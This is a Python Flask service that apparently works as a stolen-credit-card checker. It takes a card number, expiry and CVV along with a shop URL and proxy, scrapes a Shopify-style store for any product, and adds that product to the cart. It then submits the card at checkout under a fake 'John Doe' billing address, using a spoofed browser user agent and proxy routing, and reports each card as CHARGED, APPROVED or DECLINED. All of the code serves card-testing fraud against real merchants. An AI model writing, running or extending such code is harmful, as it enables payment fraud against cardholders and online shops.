import os
import json
import re
import httpx
from flask import Flask, request, jsonify
from urllib.parse import urljoin

app = Flask(__name__)

# ===== Configuration =====
PORT = int(os.environ.get("PORT", 8099))
TIMEOUT = 30.0
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
DEFAULT_VARIANT_ID = os.environ.get("DEFAULT_VARIANT_ID", None)

# ===== Helper Functions =====
def parse_card(card_str):
    parts = card_str.split('|')
    if len(parts) != 4:
        raise ValueError("Invalid card format. Use number|mm|yy|cvv")
    return {
        "number": parts[0].strip(),
        "month": parts[1].strip(),
        "year": parts[2].strip(),
        "cvv": parts[3].strip()
    }

def normalize_year(y):
    return "20" + y if len(y) == 2 else y

def parse_shop_url(url):
    url = url.strip()
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    return url.rstrip('/')

def get_proxy_url(proxy):
    """
    Convert various proxy formats to httpx-compatible URL.
    Supports:
      - ip:port
      - ip:port:user:pass
      - user:pass@ip:port
      - http://user:pass@ip:port
    """
    if not proxy:
        return None
    proxy = proxy.strip()
    # If it already starts with a scheme, return as-is
    if proxy.startswith(("http://", "https://", "socks5://")):
        return proxy

    # Try to parse ip:port:user:pass or user:pass@ip:port
    parts = proxy.split('@')
    if len(parts) == 2:
        # user:pass@ip:port
        user_pass = parts[0]
        host_port = parts[1]
        return f"http://{user_pass}@{host_port}"

    # No @, try splitting by colon
    segments = proxy.split(':')
    if len(segments) == 2:
        # ip:port
        return f"http://{proxy}"
    elif len(segments) == 4:
        # ip:port:user:pass
        ip, port, user, password = segments[0], segments[1], segments[2], segments[3]
        return f"http://{user}:{password}@{ip}:{port}"
    else:
        # Fallback: just prepend http://
        return f"http://{proxy}"

# ===== Ultra‑Aggressive Product Detection =====
def get_variant_id(client, shop_url):
    # If user set a fixed ID, use it
    if DEFAULT_VARIANT_ID:
        return DEFAULT_VARIANT_ID

    methods = [
        lambda: _from_homepage(client, shop_url),
        lambda: _from_products_json(client, shop_url),
        lambda: _from_collections_all(client, shop_url),
        lambda: _from_collections_all_json(client, shop_url),
        lambda: _from_search(client, shop_url),
        lambda: _from_sitemap(client, shop_url),
        lambda: _from_common_handles(client, shop_url),
        # Ultimate fallback: try product ID 1
        lambda: "1",
    ]

    for method in methods:
        try:
            result = method()
            if result:
                app.logger.info(f"Product found via {method.__name__ if hasattr(method, '__name__') else 'fallback'}: {result}")
                return result
        except Exception as e:
            app.logger.warning(f"{method.__name__ if hasattr(method, '__name__') else 'fallback'} failed: {e}")
            continue

    return None

def _from_homepage(client, shop_url):
    resp = client.get(shop_url)
    if resp.status_code == 200:
        matches = re.findall(r'/products/([a-zA-Z0-9\-]+)', resp.text)
        if matches:
            handle = matches[0]
            prod_url = urljoin(shop_url, f"/products/{handle}.js")
            vresp = client.get(prod_url)
            if vresp.status_code == 200:
                data = vresp.json()
                variants = data.get("variants", [])
                if variants:
                    return str(variants[0]["id"])
    return None

def _from_products_json(client, shop_url):
    json_url = urljoin(shop_url, "/products.json")
    resp = client.get(json_url)
    if resp.status_code == 200:
        data = resp.json()
        products = data.get("products", [])
        if products:
            variants = products[0].get("variants", [])
            if variants:
                return str(variants[0]["id"])
    return None

def _from_collections_all(client, shop_url):
    coll_url = urljoin(shop_url, "/collections/all")
    resp = client.get(coll_url)
    if resp.status_code == 200:
        matches = re.findall(r'/products/([a-zA-Z0-9\-]+)', resp.text)
        if matches:
            handle = matches[0]
            prod_url = urljoin(shop_url, f"/products/{handle}.js")
            vresp = client.get(prod_url)
            if vresp.status_code == 200:
                data = vresp.json()
                variants = data.get("variants", [])
                if variants:
                    return str(variants[0]["id"])
    return None

def _from_collections_all_json(client, shop_url):
    json_url = urljoin(shop_url, "/collections/all/products.json")
    resp = client.get(json_url)
    if resp.status_code == 200:
        data = resp.json()
        products = data.get("products", [])
        if products:
            variants = products[0].get("variants", [])
            if variants:
                return str(variants[0]["id"])
    return None

def _from_search(client, shop_url):
    search_url = urljoin(shop_url, "/search?q=*&view=json")
    resp = client.get(search_url)
    if resp.status_code == 200:
        data = resp.json()
        products = data.get("products", data.get("items", []))
        if products:
            variants = products[0].get("variants", [])
            if variants:
                return str(variants[0]["id"])
    return None

def _from_sitemap(client, shop_url):
    sitemaps = ["/sitemap.xml", "/sitemap_products_1.xml", "/sitemap_products_1.xml.gz"]
    for sitemap in sitemaps:
        try:
            resp = client.get(urljoin(shop_url, sitemap))
            if resp.status_code == 200:
                matches = re.findall(r'<loc>.*?/products/([a-zA-Z0-9\-]+)</loc>', resp.text)
                if matches:
                    handle = matches[0]
                    prod_url = urljoin(shop_url, f"/products/{handle}.js")
                    vresp = client.get(prod_url)
                    if vresp.status_code == 200:
                        data = vresp.json()
                        variants = data.get("variants", [])
                        if variants:
                            return str(variants[0]["id"])
        except:
            continue
    return None

def _from_common_handles(client, shop_url):
    common_handles = ["default", "product", "main", "featured", "1", "shop"]
    for handle in common_handles:
        try:
            prod_url = urljoin(shop_url, f"/products/{handle}.js")
            vresp = client.get(prod_url)
            if vresp.status_code == 200:
                data = vresp.json()
                variants = data.get("variants", [])
                if variants:
                    return str(variants[0]["id"])
        except:
            continue
    return None

# ===== Core Checkout Logic =====
def perform_checkout(card_data, shop_url, proxy):
    proxy_url = get_proxy_url(proxy)
    app.logger.info(f"Using proxy: {proxy_url if proxy_url else 'None'}")
    with httpx.Client(
        timeout=TIMEOUT,
        follow_redirects=True,
        headers={
            "User-Agent": USER_AGENT,
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
        },
        proxies=proxy_url
    ) as client:
        # 1. Get product variant ID
        variant_id = get_variant_id(client, shop_url)
        if not variant_id:
            app.logger.error(f"No product found for {shop_url} after all methods.")
            return {"status": "ERROR", "message": "No product found", "retryable": True}

        # 2. Add product to cart
        add_url = urljoin(shop_url, "/cart/add.js")
        add_payload = {"id": variant_id, "quantity": 1}
        try:
            resp = client.post(add_url, json=add_payload)
            if resp.status_code != 200:
                return {
                    "status": "ERROR",
                    "message": f"Cart add failed (HTTP {resp.status_code})",
                    "retryable": True
                }
            cart_data = resp.json()
            items = cart_data.get("items", [])
            if not items:
                return {"status": "ERROR", "message": "No items in cart", "retryable": True}
            checkout_token = items[0].get("checkout_token")
            if not checkout_token:
                return {"status": "ERROR", "message": "No checkout token", "retryable": True}
        except Exception as e:
            app.logger.error(f"Cart add error: {e}")
            return {"status": "ERROR", "message": f"Cart error: {str(e)}", "retryable": True}

        # 3. Set billing address (dummy US address)
        billing = {
            "billing_address": {
                "first_name": "John",
                "last_name": "Doe",
                "address1": "123 Main St",
                "city": "New York",
                "province": "NY",
                "zip": "10001",
                "country": "US",
                "phone": "2125555555",
                "company": ""
            }
        }
        bill_url = f"{shop_url}/checkout/{checkout_token}/billing_address.json"
        try:
            resp = client.post(bill_url, json=billing)
            if resp.status_code not in (200, 201):
                return {"status": "ERROR", "message": "Failed to set billing address", "retryable": True}
        except Exception as e:
            app.logger.error(f"Billing address error: {e}")
            return {"status": "ERROR", "message": f"Billing error: {str(e)}", "retryable": True}

        # 4. Submit payment
        payment_payload = {
            "payment": {
                "credit_card": {
                    "number": card_data["number"],
                    "month": card_data["month"],
                    "year": normalize_year(card_data["year"]),
                    "verification_value": card_data["cvv"],
                    "first_name": "John",
                    "last_name": "Doe"
                },
                "billing_address": billing["billing_address"]
            }
        }
        pay_url = f"{shop_url}/checkout/{checkout_token}/payment.json"
        try:
            resp = client.post(pay_url, json=payment_payload)
            if resp.status_code == 200:
                result = resp.json()
                status = result.get("status")
                if status == "completed":
                    return {
                        "status": "CHARGED",
                        "message": "Payment captured",
                        "amount": result.get("amount", "0.00"),
                        "gateway": "Shopify Payments",
                        "receipt_url": result.get("receipt_url", ""),
                        "retryable": False
                    }
                elif status == "authorized":
                    return {
                        "status": "APPROVED",
                        "message": "Auth approved",
                        "amount": result.get("amount", "0.00"),
                        "gateway": "Shopify Payments",
                        "receipt_url": "",
                        "retryable": False
                    }
                else:
                    msg = result.get("message", "Unknown decline")
                    if "insufficient" in msg.lower():
                        return {"status": "DECLINED", "message": "Insufficient funds", "retryable": False}
                    elif "3d" in msg.lower() or "3d_secure" in msg.lower():
                        return {"status": "DECLINED", "message": "3DS required", "retryable": False}
                    else:
                        return {"status": "DECLINED", "message": msg, "retryable": False}
            else:
                text = resp.text.lower()
                if "3d" in text or "3d_secure" in text:
                    return {"status": "DECLINED", "message": "3DS required", "retryable": False}
                return {
                    "status": "DECLINED",
                    "message": f"Payment failed (HTTP {resp.status_code})",
                    "retryable": False
                }
        except httpx.TimeoutException:
            return {"status": "ERROR", "message": "Payment timeout", "retryable": True}
        except Exception as e:
            app.logger.error(f"Payment exception: {e}")
            return {"status": "ERROR", "message": f"Payment error: {str(e)}", "retryable": True}

# ===== Flask Routes =====
@app.route('/check', methods=['POST'])
def check():
    data = request.get_json()
    if not data:
        return jsonify({"status": "ERROR", "message": "Missing JSON body"}), 400

    card_str = data.get('card')
    shop_url = data.get('shop_url')
    proxy = data.get('proxy', '')

    if not card_str or not shop_url:
        return jsonify({"status": "ERROR", "message": "Missing card or shop_url"}), 400

    try:
        card = parse_card(card_str)
        shop_url = parse_shop_url(shop_url)
        result = perform_checkout(card, shop_url, proxy)
        return jsonify(result)
    except ValueError as e:
        app.logger.error(f"Card parse error: {e}")
        return jsonify({"status": "ERROR", "message": str(e), "retryable": False}), 400
    except Exception as e:
        app.logger.error(f"Unhandled error: {e}")
        return jsonify({"status": "ERROR", "message": f"Internal error: {str(e)}", "retryable": True}), 500

@app.route('/health', methods=['GET'])
def health():
    return jsonify({"status": "ok"})

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 8099))
    app.run(host='0.0.0.0', port=port)
